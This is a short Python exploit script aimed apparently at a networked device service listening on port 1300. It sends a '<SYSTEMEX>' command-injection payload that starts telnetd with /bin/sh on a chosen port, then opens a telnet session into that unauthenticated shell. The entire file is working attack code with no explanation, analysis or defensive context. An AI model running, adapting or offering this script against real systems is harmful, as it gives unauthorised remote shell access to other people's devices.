from time import sleep
import requests
import socket
import sys
import os


if __name__ == "__main__":
	TARGET_IP = sys.argv[1]
	SHELL_PORT = sys.argv[2]

	SHELL_OPERATION = "<SYSTEMEX>telnetd -p %s -l /bin/sh &</SYSTEMEX>" % SHELL_PORT

	print("\x1b[01;38;5;214m[+] Connect to target ip\x1b[0m")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TARGET_IP,1300))
	sleep(0.5)

	print("[+] Sending payload to %s ..." % TARGET_IP)
	s.send(SHELL_OPERATION.encode())
	
	s.recv(1024)
	sleep(1)
	
	print("\x1b[01;38;5;1m[+] Successfully connect to Port %s\x1b[0m" % SHELL_PORT)
	os.system("telnet %s %s" % (TARGET_IP,SHELL_PORT))
	
	s.close()